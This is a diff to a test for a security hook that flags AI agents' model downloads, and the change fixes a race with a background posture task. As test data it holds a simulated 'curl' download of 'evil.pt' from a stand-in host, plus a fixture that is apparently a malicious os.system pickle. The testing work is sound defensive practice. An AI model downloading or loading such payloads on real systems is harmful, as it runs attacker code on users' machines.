@@ -260,19 +260,18 @@ test("end to end: the hook reports a model download (#76) and queues it without 
   const st = join(home, ".moorai");
   mkdirSync(st, { recursive: true });
   writeFileSync(join(st, "config.json"), JSON.stringify({ serverUrl: c.url, tenant: TENANT, installToken: "tok-model-scan" }));
+  // Today's posture beat is stamped as sent, so the hook does not spawn it. The beat drains the download
+  // queue too, and on a CI runner it wrote the scan state before the hook's own exit could be checked;
+  // with it out of the way, the only scanner left is the modelscan worker a later event spawns.
+  writeFileSync(join(st, "posture-beat-claude-code.json"), JSON.stringify({ day: new Date().toISOString().slice(0, 10) }));
   const proj = join(home, "proj");
   mkdirSync(proj, { recursive: true });
   const out = await runHook(home, { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "curl -L -o evil.pt https://models.example/evil.pt" }, session_id: "s-ms", cwd: proj });
   assert.ok(!/"permissionDecision":"deny"/.test(out), "report-only: the download is not blocked");
-  // Read at once: the posture beat this event spawned also drains the queue, and on a slow runner it did so
-  // before the #76 alert arrived, so a later read saw its scan state, not the hook's.
   assert.ok(!existsSync(join(st, MODEL_SCAN_STATE)), "nothing was scanned on PreToolUse");
   const q = readQueue(st);
   assert.deepEqual(q.map((x) => x.path), [join(proj, "evil.pt")]);
   assert.ok(await until(() => c.alerts.some((a) => a.threatId === 76)), "the #76 report reached the console");
-  // The day's posture beat (spawned by that first event) also drains the queue. Let it finish first, so
-  // what scans the file below can only be the modelscan worker the next event spawns.
-  assert.ok(await until(() => c.beats.length > 0 && existsSync(join(st, "inventory-detectors.json"))), "the day's posture beat finished");
   // The download lands (simulated), and both it and the queue entry are past the settle time.
   const p = put(join(proj, "evil.pt"), torchZip(PICKLES.osSystem));
   ago(p, 2 * SETTLE_MS);
